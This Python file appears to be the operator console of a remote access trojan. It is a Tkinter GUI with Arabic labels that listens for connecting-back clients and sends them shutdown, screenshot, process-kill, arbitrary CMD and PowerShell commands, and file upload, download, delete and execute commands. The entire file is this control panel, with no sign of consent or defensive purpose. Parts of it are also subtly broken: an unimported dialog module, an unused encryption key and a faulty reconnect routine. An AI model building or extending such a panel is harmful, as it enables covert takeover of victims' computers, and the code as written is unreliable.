import socket
import threading
import json
import time
import datetime
import os
import subprocess
import base64
import sys
from collections import defaultdict
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import select
from cryptography.fernet import Fernet

class AdvancedRemoteListener:
    def __init__(self):
        self.is_listening = False
        self.clients = {}
        self.sessions = defaultdict(list)
        self.current_session = None
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
        # إنشاء النافذة الرئيسية
        self.root = tk.Tk()
        self.root.title("نظام الاستماع والتحكم المتقدم - Advanced Remote Controller")
        self.root.geometry("1200x800")
        
        self.setup_ui()
        
    def setup_ui(self):
        # إنشاء Notebook للتبويبات
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # تبويب الاستماع
        self.listen_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.listen_tab, text="الاستماع")
        
        # تبويب التحكم
        self.control_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.control_tab, text="التحكم عن بعد")
        
        # تبويب إدارة الملفات
        self.files_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.files_tab, text="إدارة الملفات")
        
        # تبويب الأوامر المخصصة
        self.commands_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.commands_tab, text="أوامر مخصصة")
        
        # إعداد واجهة الاستماع
        self.setup_listen_tab()
        
        # إعداد واجهة التحكم
        self.setup_control_tab()
        
        # إعداد واجهة إدارة الملفات
        self.setup_files_tab()
        
        # إعداد واجهة الأوامر المخصصة
        self.setup_commands_tab()
        
        # إعدادات المتغيرات
        self.connection_count = 0
        self.packet_count = 0
        self.data_received = 0
        self.session_counter = 0
        self.selected_client = None
        
    def setup_listen_tab(self):
        # إطار الإعدادات
        settings_frame = ttk.LabelFrame(self.listen_tab, text="إعدادات الاتصال", padding=10)
        settings_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(settings_frame, text="المنفذ:").grid(row=0, column=0, padx=5, pady=5)
        self.port_entry = ttk.Entry(settings_frame, width=10)
        self.port_entry.insert(0, "8080")
        self.port_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(settings_frame, text="نوع البروتوكول:").grid(row=0, column=2, padx=5, pady=5)
        self.protocol_var = tk.StringVar(value="TCP")
        protocol_combo = ttk.Combobox(settings_frame, textvariable=self.protocol_var, 
                                     values=["TCP", "UDP"], state="readonly", width=8)
        protocol_combo.grid(row=0, column=3, padx=5, pady=5)
        
        self.start_btn = ttk.Button(settings_frame, text="بدء الاستماع", command=self.toggle_listening)
        self.start_btn.grid(row=0, column=4, padx=5, pady=5)
        
        # إطار الإحصائيات
        stats_frame = ttk.LabelFrame(self.listen_tab, text="الإحصائيات", padding=10)
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(stats_frame, text="الاتصالات النشطة:").grid(row=0, column=0, padx=5, pady=2)
        self.connections_label = ttk.Label(stats_frame, text="0")
        self.connections_label.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(stats_frame, text="الحزم المستلمة:").grid(row=0, column=2, padx=5, pady=2)
        self.packets_label = ttk.Label(stats_frame, text="0")
        self.packets_label.grid(row=0, column=3, padx=5, pady=2)
        
        ttk.Label(stats_frame, text="البيانات المستلمة:").grid(row=0, column=4, padx=5, pady=2)
        self.data_label = ttk.Label(stats_frame, text="0 بايت")
        self.data_label.grid(row=0, column=5, padx=5, pady=2)
        
        # إطار الجلسات
        sessions_frame = ttk.LabelFrame(self.listen_tab, text="الجلسات النشطة", padding=10)
        sessions_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.sessions_tree = ttk.Treeview(sessions_frame, columns=("id", "address", "start_time", "packets", "os"), height=5)
        self.sessions_tree.heading("#0", text="م")
        self.sessions_tree.heading("id", text="معرف الجلسة")
        self.sessions_tree.heading("address", text="العنوان")
        self.sessions_tree.heading("start_time", text="وقت البدء")
        self.sessions_tree.heading("packets", text="عدد الحزم")
        self.sessions_tree.heading("os", text="نظام التشغيل")
        
        self.sessions_tree.column("#0", width=50)
        self.sessions_tree.column("id", width=150)
        self.sessions_tree.column("address", width=200)
        self.sessions_tree.column("start_time", width=150)
        self.sessions_tree.column("packets", width=100)
        self.sessions_tree.column("os", width=100)
        
        self.sessions_tree.pack(fill=tk.X)
        
        # ربط حدث عند اختيار جلسة
        self.sessions_tree.bind("<<TreeviewSelect>>", self.on_session_select)
        
        # إطار البيانات
        data_frame = ttk.LabelFrame(self.listen_tab, text="البيانات المستلمة", padding=10)
        data_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # شريط الأدوات
        toolbar = ttk.Frame(data_frame)
        toolbar.pack(fill=tk.X)
        
        ttk.Button(toolbar, text="حفظ البيانات", command=self.save_data).pack(side=tk.RIGHT, padx=5)
        ttk.Button(toolbar, text="مسح السجل", command=self.clear_log).pack(side=tk.RIGHT, padx=5)
        ttk.Button(toolbar, text="تصدير الجلسة", command=self.export_session).pack(side=tk.RIGHT, padx=5)
        
        # منطقة النص
        self.log_area = scrolledtext.ScrolledText(data_frame, wrap=tk.WORD, height=20)
        self.log_area.pack(fill=tk.BOTH, expand=True)
        
        # إطار التحكم
        control_frame = ttk.LabelFrame(self.listen_tab, text="خيارات متقدمة", padding=10)
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(control_frame, text="الرد التلقائي:").grid(row=0, column=0, padx=5, pady=2)
        self.auto_reply_entry = ttk.Entry(control_frame, width=30)
        self.auto_reply_entry.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Checkbutton(control_frame, text="تمكين الرد التلقائي").grid(row=0, column=2, padx=5, pady=2)
        ttk.Checkbutton(control_frame, text="تسجيل جميع البيانات").grid(row=0, column=3, padx=5, pady=2)
        ttk.Checkbutton(control_frame, text="تشفير السجلات").grid(row=0, column=4, padx=5, pady=2)
    
    def setup_control_tab(self):
        # إطار اختيار العميل
        client_frame = ttk.LabelFrame(self.control_tab, text="اختيار العميل", padding=10)
        client_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(client_frame, text="العميل المحدد:").grid(row=0, column=0, padx=5, pady=5)
        self.client_var = tk.StringVar()
        self.client_combo = ttk.Combobox(client_frame, textvariable=self.client_var, state="readonly")
        self.client_combo.grid(row=0, column=1, padx=5, pady=5)
        self.client_combo.bind("<<ComboboxSelected>>", self.on_client_select)
        
        ttk.Button(client_frame, text="تحديث", command=self.update_client_list).grid(row=0, column=2, padx=5, pady=5)
        ttk.Button(client_frame, text="معلومات النظام", command=self.get_system_info).grid(row=0, column=3, padx=5, pady=5)
        ttk.Button(client_frame, text="إعادة الاتصال", command=self.reconnect_client).grid(row=0, column=4, padx=5, pady=5)
        
        # إطار الأوامر الأساسية
        basic_cmd_frame = ttk.LabelFrame(self.control_tab, text="أوامر أساسية", padding=10)
        basic_cmd_frame.pack(fill=tk.X, padx=10, pady=5)
        
        commands = [
            ("الحصول على معلومات النظام", "system_info"),
            ("سكرين شوت", "screenshot"),
            ("إيقاف التشغيل", "shutdown"),
            ("إعادة التشغيل", "restart"),
            ("فتح متصفح الويب", "open_browser"),
            ("قائمة العمليات", "process_list"),
            ("إنهاء عملية", "kill_process"),
            ("قائمة الخدمات", "services_list")
        ]
        
        for i, (text, cmd) in enumerate(commands):
            row = i // 4
            col = i % 4
            ttk.Button(basic_cmd_frame, text=text, command=lambda c=cmd: self.send_command(c)).grid(row=row, column=col, padx=5, pady=5)
        
        # إطار الأوامر المخصصة
        custom_cmd_frame = ttk.LabelFrame(self.control_tab, text="أوامر مخصصة", padding=10)
        custom_cmd_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(custom_cmd_frame, text="الأمر:").grid(row=0, column=0, padx=5, pady=5)
        self.custom_cmd_entry = ttk.Entry(custom_cmd_frame, width=50)
        self.custom_cmd_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(custom_cmd_frame, text="تنفيذ", command=self.execute_custom_command).grid(row=0, column=2, padx=5, pady=5)
        ttk.Button(custom_cmd_frame, text="أمر CMD", command=self.open_cmd).grid(row=0, column=3, padx=5, pady=5)
        ttk.Button(custom_cmd_frame, text="أمر PowerShell", command=self.open_powershell).grid(row=0, column=4, padx=5, pady=5)
        
        # إطار النتائج
        result_frame = ttk.LabelFrame(self.control_tab, text="النتائج", padding=10)
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.result_area = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, height=20)
        self.result_area.pack(fill=tk.BOTH, expand=True)
    
    def setup_files_tab(self):
        # إطار اختيار العميل
        client_frame = ttk.LabelFrame(self.files_tab, text="اختيار العميل", padding=10)
        client_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(client_frame, text="العميل المحدد:").grid(row=0, column=0, padx=5, pady=5)
        self.files_client_var = tk.StringVar()
        self.files_client_combo = ttk.Combobox(client_frame, textvariable=self.files_client_var, state="readonly")
        self.files_client_combo.grid(row=0, column=1, padx=5, pady=5)
        self.files_client_combo.bind("<<ComboboxSelected>>", self.on_files_client_select)
        
        ttk.Button(client_frame, text="تحديث", command=self.update_files_client_list).grid(row=0, column=2, padx=5, pady=5)
        
        # إطار استعراض الملفات
        browse_frame = ttk.LabelFrame(self.files_tab, text="استعراض الملفات", padding=10)
        browse_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(browse_frame, text="المسار:").grid(row=0, column=0, padx=5, pady=5)
        self.path_var = tk.StringVar(value="C:\\")
        self.path_entry = ttk.Entry(browse_frame, textvariable=self.path_var, width=50)
        self.path_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Button(browse_frame, text="استعراض", command=self.browse_files).grid(row=0, column=2, padx=5, pady=5)
        ttk.Button(browse_frame, text="جلب الملفات", command=self.get_files).grid(row=0, column=3, padx=5, pady=5)
        
        # إطار قائمة الملفات
        files_frame = ttk.LabelFrame(self.files_tab, text="قائمة الملفات", padding=10)
        files_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        columns = ("name", "size", "type", "modified")
        self.files_tree = ttk.Treeview(files_frame, columns=columns, height=15)
        
        self.files_tree.heading("#0", text="م")
        self.files_tree.heading("name", text="الاسم")
        self.files_tree.heading("size", text="الحجم")
        self.files_tree.heading("type", text="النوع")
        self.files_tree.heading("modified", text="آخر تعديل")
        
        self.files_tree.column("#0", width=50)
        self.files_tree.column("name", width=200)
        self.files_tree.column("size", width=100)
        self.files_tree.column("type", width=100)
        self.files_tree.column("modified", width=150)
        
        self.files_tree.pack(fill=tk.BOTH, expand=True)
        
        # ربط حدث النقر المزدوج على الملف
        self.files_tree.bind("<Double-1>", self.on_file_double_click)
        
        # إطار عمليات الملفات
        file_ops_frame = ttk.Frame(self.files_tab)
        file_ops_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(file_ops_frame, text="تحميل", command=self.upload_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_ops_frame, text="تنزيل", command=self.download_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_ops_frame, text="حذف", command=self.delete_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_ops_frame, text="تشغيل", command=self.execute_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_ops_frame, text="إنشاء مجلد", command=self.create_folder).pack(side=tk.LEFT, padx=5)
    
    def setup_commands_tab(self):
        # إطار اختيار العميل
        client_frame = ttk.LabelFrame(self.commands_tab, text="اختيار العميل", padding=10)
        client_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(client_frame, text="العميل المحدد:").grid(row=0, column=0, padx=5, pady=5)
        self.cmds_client_var = tk.StringVar()
        self.cmds_client_combo = ttk.Combobox(client_frame, textvariable=self.cmds_client_var, state="readonly")
        self.cmds_client_combo.grid(row=0, column=1, padx=5, pady=5)
        self.cmds_client_combo.bind("<<ComboboxSelected>>", self.on_cmds_client_select)
        
        ttk.Button(client_frame, text="تحديث", command=self.update_cmds_client_list).grid(row=0, column=2, padx=5, pady=5)
        
        # إطار الأوامر المخصصة
        custom_cmds_frame = ttk.LabelFrame(self.commands_tab, text="أوامر مخصصة", padding=10)
        custom_cmds_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(custom_cmds_frame, text="الأمر:").grid(row=0, column=0, padx=5, pady=5)
        self.custom_cmd_text = scrolledtext.ScrolledText(custom_cmds_frame, height=5, width=50)
        self.custom_cmd_text.grid(row=0, column=1, padx=5, pady=5, columnspan=3)
        
        ttk.Button(custom_cmds_frame, text="تنفيذ", command=self.execute_custom_script).grid(row=1, column=1, padx=5, pady=5)
        ttk.Button(custom_cmds_frame, text="حفظ", command=self.save_custom_command).grid(row=1, column=2, padx=5, pady=5)
        ttk.Button(custom_cmds_frame, text="تحميل", command=self.load_custom_command).grid(row=1, column=3, padx=5, pady=5)
        
        # إطار الأوامر المحفوظة
        saved_cmds_frame = ttk.LabelFrame(self.commands_tab, text="الأوامر المحفوظة", padding=10)
        saved_cmds_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.saved_cmds_list = tk.Listbox(saved_cmds_frame)
        self.saved_cmds_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # إطار النتائج
        cmd_result_frame = ttk.LabelFrame(self.commands_tab, text="النتائج", padding=10)
        cmd_result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.cmd_result_area = scrolledtext.ScrolledText(cmd_result_frame, wrap=tk.WORD, height=15)
        self.cmd_result_area.pack(fill=tk.BOTH, expand=True)
    
    def toggle_listening(self):
        if not self.is_listening:
            self.start_listening()
        else:
            self.stop_listening()
            
    def start_listening(self):
        try:
            port = int(self.port_entry.get())
            protocol = self.protocol_var.get()
            
            if protocol == "TCP":
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.bind(('0.0.0.0', port))
                self.socket.listen(5)
            else:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.socket.bind(('0.0.0.0', port))
            
            self.is_listening = True
            self.start_btn.config(text="إيقاف الاستماع")
            
            # بدء thread الاستماع
            self.listen_thread = threading.Thread(target=self.listen_loop)
            self.listen_thread.daemon = True
            self.listen_thread.start()
            
            self.log_message(f"بدأ الاستماع على المنفذ {port} باستخدام بروتوكول {protocol}")
            
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في بدء الاستماع: {str(e)}")
    
    def stop_listening(self):
        self.is_listening = False
        try:
            self.socket.close()
        except:
            pass
        
        self.start_btn.config(text="بدء الاستماع")
        self.log_message("تم إيقاف الاستماع")
    
    def listen_loop(self):
        if self.protocol_var.get() == "TCP":
            while self.is_listening:
                try:
                    readable, _, _ = select.select([self.socket], [], [], 1)
                    if self.socket in readable:
                        client_socket, addr = self.socket.accept()
                        self.handle_new_connection(client_socket, addr)
                except:
                    break
        else:
            while self.is_listening:
                try:
                    data, addr = self.socket.recvfrom(4096)
                    self.handle_udp_data(data, addr)
                except:
                    break
    
    def handle_new_connection(self, client_socket, addr):
        self.connection_count += 1
        self.connections_label.config(text=str(self.connection_count))
        
        session_id = f"session_{self.session_counter}"
        self.session_counter += 1
        
        # تسجيل الجلسة الجديدة
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.sessions_tree.insert("", "end", text=str(self.session_counter), 
                                 values=(session_id, f"{addr[0]}:{addr[1]}", start_time, "0", "غير معروف"))
        
        # تخزين معلومات العميل
        self.clients[session_id] = {
            'socket': client_socket,
            'address': addr,
            'start_time': start_time,
            'os': 'غير معروف',
            'packets': 0
        }
        
        # تحديث قوائم العملاء
        self.update_client_lists()
        
        # بدء thread للتعامل مع العميل
        client_thread = threading.Thread(target=self.handle_client, 
                                        args=(client_socket, addr, session_id))
        client_thread.daemon = True
        client_thread.start()
        
        self.log_message(f"اتصال جديد من {addr[0]}:{addr[1]} - معرف الجلسة: {session_id}")
    
    def handle_udp_data(self, data, addr):
        self.packet_count += 1
        self.data_received += len(data)
        
        self.update_stats()
        
        session_id = f"udp_session_{addr[0]}_{addr[1]}"
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # تسجيل البيانات
        decoded_data = data.decode('utf-8', errors='replace')
        self.sessions[session_id].append({
            "timestamp": timestamp,
            "data": decoded_data,
            "source": f"{addr[0]}:{addr[1]}",
            "size": len(data)
        })
        
        self.log_message(f"بيانات UDP من {addr[0]}:{addr[1]}: {decoded_data}")
    
    def handle_client(self, client_socket, addr, session_id):
        client_socket.settimeout(1.0)
        
        # إرسال طلب للحصول على معلومات النظام
        try:
            client_socket.send("system_info".encode())
            data = client_socket.recv(4096)
            if data:
                system_info = data.decode('utf-8', errors='replace')
                self.clients[session_id]['os'] = system_info
                
                # تحديث الجدول بمعلومات النظام
                for item in self.sessions_tree.get_children():
                    if self.sessions_tree.item(item, "values")[0] == session_id:
                        self.sessions_tree.item(item, values=(
                            session_id,
                            f"{addr[0]}:{addr[1]}",
                            self.clients[session_id]['start_time'],
                            str(self.clients[session_id]['packets']),
                            system_info
                        ))
                        break
        except:
            pass
        
        while self.is_listening:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                self.packet_count += 1
                self.data_received += len(data)
                self.clients[session_id]['packets'] += 1
                self.update_stats()
                
                # تحديث عدد الحزم في الجلسة
                for item in self.sessions_tree.get_children():
                    if self.sessions_tree.item(item, "values")[0] == session_id:
                        self.sessions_tree.item(item, values=(
                            session_id,
                            f"{addr[0]}:{addr[1]}",
                            self.clients[session_id]['start_time'],
                            str(self.clients[session_id]['packets']),
                            self.clients[session_id]['os']
                        ))
                        break
                
                # تسجيل البيانات
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                decoded_data = data.decode('utf-8', errors='replace')
                
                self.sessions[session_id].append({
                    "timestamp": timestamp,
                    "data": decoded_data,
                    "source": f"{addr[0]}:{addr[1]}",
                    "size": len(data)
                })
                
                self.log_message(f"بيانات من {session_id}: {decoded_data}")
                
                # إذا كانت البيانات تحتوي على نتيجة أمر
                if decoded_data.startswith("CMD_RESULT:"):
                    result = decoded_data[len("CMD_RESULT:"):]
                    self.result_area.insert(tk.END, f"\nنتيجة من {session_id}:\n{result}\n")
                    self.result_area.see(tk.END)
                
                # إذا كانت البيانات تحتوي على نتيجة ملف
                elif decoded_data.startswith("FILE_LIST:"):
                    files_data = decoded_data[len("FILE_LIST:"):]
                    self.display_files(session_id, files_data)
                    
            except socket.timeout:
                continue
            except:
                break
        
        client_socket.close()
        self.connection_count -= 1
        self.connections_label.config(text=str(self.connection_count))
        
        # إزالة العميل من القوائم
        if session_id in self.clients:
            del self.clients[session_id]
        self.update_client_lists()
        
        self.log_message(f"انتهت الجلسة {session_id}")
    
    def update_stats(self):
        self.packets_label.config(text=str(self.packet_count))
        self.data_label.config(text=f"{self.data_received} بايت")
    
    def log_message(self, message):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"[{timestamp}] {message}\n"
        
        self.log_area.insert(tk.END, formatted_message)
        self.log_area.see(tk.END)
    
    def save_data(self):
        # حفظ البيانات في ملف
        try:
            filename = f"listener_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.sessions, f, ensure_ascii=False, indent=2)
            
            self.log_message(f"تم حفظ البيانات في ملف {filename}")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في حفظ البيانات: {str(e)}")
    
    def clear_log(self):
        self.log_area.delete(1.0, tk.END)
    
    def export_session(self):
        # تصدير الجلسة المحددة
        selected = self.sessions_tree.focus()
        if not selected:
            messagebox.showwarning("تحذير", "يرجى تحديد جلسة أولاً")
            return
        
        session_id = self.sessions_tree.item(selected, "values")[0]
        if session_id in self.sessions:
            try:
                filename = f"session_{session_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(self.sessions[session_id], f, ensure_ascii=False, indent=2)
                
                self.log_message(f"تم تصدير الجلسة {session_id} إلى ملف {filename}")
            except Exception as e:
                messagebox.showerror("خطأ", f"فشل في تصدير الجلسة: {str(e)}")
    
    def on_session_select(self, event):
        selected = self.sessions_tree.focus()
        if selected:
            session_id = self.sessions_tree.item(selected, "values")[0]
            self.current_session = session_id
    
    def update_client_list(self):
        self.client_combo['values'] = list(self.clients.keys())
    
    def update_files_client_list(self):
        self.files_client_combo['values'] = list(self.clients.keys())
    
    def update_cmds_client_list(self):
        self.cmds_client_combo['values'] = list(self.clients.keys())
    
    def update_client_lists(self):
        self.update_client_list()
        self.update_files_client_list()
        self.update_cmds_client_list()
    
    def on_client_select(self, event):
        self.selected_client = self.client_var.get()
    
    def on_files_client_select(self, event):
        self.selected_client = self.files_client_var.get()
    
    def on_cmds_client_select(self, event):
        self.selected_client = self.cmds_client_var.get()
    
    def send_command(self, command):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        try:
            client_socket = self.clients[self.selected_client]['socket']
            client_socket.send(command.encode())
            self.log_message(f"تم إرسال الأمر {command} إلى {self.selected_client}")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في إرسال الأمر: {str(e)}")
    
    def get_system_info(self):
        self.send_command("system_info")
    
    def reconnect_client(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        try:
            client_socket = self.clients[self.selected_client]['socket']
            addr = self.clients[self.selected_client]['address']
            
            # إغلاق الاتصال الحالي
            client_socket.close()
            
            # إعادة الاتصال
            new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_socket.connect(addr)
            
            # تحديث معلومات العميل
            self.clients[self.selected_client]['socket'] = new_socket
            
            self.log_message(f"تم إعادة الاتصال بالعميل {self.selected_client}")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في إعادة الاتصال: {str(e)}")
    
    def execute_custom_command(self):
        command = self.custom_cmd_entry.get()
        if not command:
            messagebox.showwarning("تحذير", "يرجى إدخال أمر أولاً")
            return
        
        self.send_command(f"custom_cmd:{command}")
    
    def open_cmd(self):
        self.send_command("open_cmd")
    
    def open_powershell(self):
        self.send_command("open_powershell")
    
    def browse_files(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        path = self.path_var.get()
        self.send_command(f"browse_files:{path}")
    
    def get_files(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        path = self.path_var.get()
        self.send_command(f"get_files:{path}")
    
    def display_files(self, session_id, files_data):
        try:
            # مسح المحتوى الحالي
            for item in self.files_tree.get_children():
                self.files_tree.delete(item)
            
            # تحليل بيانات الملفات
            files = files_data.split('|')
            for i, file_info in enumerate(files):
                if file_info:
                    parts = file_info.split(';')
                    if len(parts) >= 4:
                        name, size, ftype, modified = parts[:4]
                        self.files_tree.insert("", "end", text=str(i+1), 
                                              values=(name, size, ftype, modified))
        except Exception as e:
            self.log_message(f"خطأ في عرض الملفات: {str(e)}")
    
    def on_file_double_click(self, event):
        selected = self.files_tree.focus()
        if selected:
            file_name = self.files_tree.item(selected, "values")[0]
            current_path = self.path_var.get()
            new_path = os.path.join(current_path, file_name)
            self.path_var.set(new_path)
            self.get_files()
    
    def upload_file(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        file_path = filedialog.askopenfilename()
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # ترميز البيانات base64
                encoded_data = base64.b64encode(file_data).decode()
                file_name = os.path.basename(file_path)
                
                # إرسال الأمر مع البيانات
                client_socket = self.clients[self.selected_client]['socket']
                client_socket.send(f"upload_file:{file_name}:{encoded_data}".encode())
                
                self.log_message(f"تم رفع الملف {file_name} إلى {self.selected_client}")
            except Exception as e:
                messagebox.showerror("خطأ", f"فشل في رفع الملف: {str(e)}")
    
    def download_file(self):
        selected = self.files_tree.focus()
        if not selected:
            messagebox.showwarning("تحذير", "يرجى تحديد ملف أولاً")
            return
        
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        file_name = self.files_tree.item(selected, "values")[0]
        self.send_command(f"download_file:{file_name}")
    
    def delete_file(self):
        selected = self.files_tree.focus()
        if not selected:
            messagebox.showwarning("تحذير", "يرجى تحديد ملف أولاً")
            return
        
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        file_name = self.files_tree.item(selected, "values")[0]
        self.send_command(f"delete_file:{file_name}")
    
    def execute_file(self):
        selected = self.files_tree.focus()
        if not selected:
            messagebox.showwarning("تحذير", "يرجى تحديد ملف أولاً")
            return
        
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        file_name = self.files_tree.item(selected, "values")[0]
        self.send_command(f"execute_file:{file_name}")
    
    def create_folder(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        folder_name = tk.simpledialog.askstring("إنشاء مجلد", "أدخل اسم المجلد:")
        if folder_name:
            self.send_command(f"create_folder:{folder_name}")
    
    def execute_custom_script(self):
        if not self.selected_client or self.selected_client not in self.clients:
            messagebox.showwarning("تحذير", "يرجى تحديد عميل أولاً")
            return
        
        script = self.custom_cmd_text.get(1.0, tk.END).strip()
        if not script:
            messagebox.showwarning("تحذير", "يرجى إدخال نص الأمر أولاً")
            return
        
        self.send_command(f"custom_script:{script}")
    
    def save_custom_command(self):
        script = self.custom_cmd_text.get(1.0, tk.END).strip()
        if not script:
            messagebox.showwarning("تحذير", "لا يوجد أمر لحفظه")
            return
        
        name = tk.simpledialog.askstring("حفظ الأمر", "أدخل اسم الأمر:")
        if name:
            self.saved_cmds_list.insert(tk.END, f"{name}:{script}")
    
    def load_custom_command(self):
        selected = self.saved_cmds_list.curselection()
        if not selected:
            messagebox.showwarning("تحذير", "يرجى تحديد أمر أولاً")
            return
        
        command_str = self.saved_cmds_list.get(selected[0])
        name, script = command_str.split(":", 1)
        self.custom_cmd_text.delete(1.0, tk.END)
        self.custom_cmd_text.insert(tk.END, script)
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = AdvancedRemoteListener()
    app.run()
